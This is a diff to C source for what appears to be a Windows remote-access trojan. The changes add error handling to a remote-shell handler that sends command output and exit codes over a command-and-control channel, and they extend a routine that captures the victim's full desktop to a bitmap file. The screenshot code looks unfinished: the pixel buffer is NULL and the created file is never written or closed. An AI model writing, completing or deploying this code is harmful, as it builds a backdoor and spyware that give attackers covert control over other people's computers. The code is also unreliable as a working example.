@@ -78,14 +78,30 @@ void handle_shell()
         bytes_read = shell_read_output(&cmd);
         if (bytes_read != 0)
         {
-            cnc_send(&bytes_read, sizeof(bytes_read));
-            cnc_send(cmd.out, bytes_read);
+            if (cnc_send(&bytes_read, sizeof(bytes_read)) != sizeof(bytes_read))
+            {
+                return_code = E_CONNECTION_CLOSED;
+                goto cleanup;
+            }
+            if (cnc_send(cmd.out, bytes_read) != bytes_read)
+            {
+                return_code = E_CONNECTION_CLOSED;
+                goto cleanup;
+            }
         }
         else if (WaitForSingleObject(cmd.proc_info.hProcess, 0) == WAIT_OBJECT_0)
         {
-            cnc_send(&bytes_read, sizeof(bytes_read));
+            if (cnc_send(&bytes_read, sizeof(bytes_read)) != sizeof(bytes_read))
+            {
+                return_code = E_CONNECTION_CLOSED;
+                goto cleanup;
+            }
             shell_close(&cmd);
-            cnc_send(&cmd.exit_code, sizeof(cmd.exit_code));
+            if (cnc_send(&cmd.exit_code, sizeof(cmd.exit_code)) != sizeof(cmd.exit_code))
+            {
+                return_code = E_CONNECTION_CLOSED;
+                goto cleanup;
+            }
             break;
         }
     }
@@ -308,16 +324,40 @@ cleanup:
 
 void handle_screenshot()
 {
+    int return_code = 0;
     int screen_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
     int screen_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
     HDC desktop = GetDC(NULL);
-    BITMAP src_bitmap = CreateCompatibleBitmap(desktop, screen_width, screen_height);
+    HBITMAP src_bitmap = CreateCompatibleBitmap(desktop, screen_width, screen_height);
     HDC dst_bitmap = CreateCompatibleDC(desktop);
+    BITMAP screen = {};
+    HANDLE hFile = NULL;
+    BITMAPINFOHEADER bitmap_info = {
+        .biSize = sizeof(BITMAPINFOHEADER),
+        .biWidth = screen_width,
+        .biHeight = screen_height,
+        .biPlanes = 1,
+        .biBitCount = 32,
+        .biCompression = BI_RGB,
+    };
 
     SelectObject(dst_bitmap, src_bitmap);
     BitBlt(dst_bitmap, 0, 0, screen_width, screen_height, desktop, 0, 0, SRCCOPY);
+
+    GetObject(src_bitmap, sizeof(screen), &screen);
+    GetDIBits(desktop, src_bitmap, 0, screen_height, NULL, (BITMAPINFO *)&bitmap_info, DIB_RGB_COLORS);
+
+    hFile = CreateFile("capture.bmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+cleanup:
+    DeleteObject(src_bitmap);
+    DeleteObject(dst_bitmap);
     ReleaseDC(NULL, desktop);
-    DeleteDC(dst_bitmap);
+
+    if (return_code)
+        log_error("Failed to take a screenshot. Error code: %d", return_code);
+    else
+        log_info("Successfully took a screenshot.");
 }
 
 void listen_for_cmds()
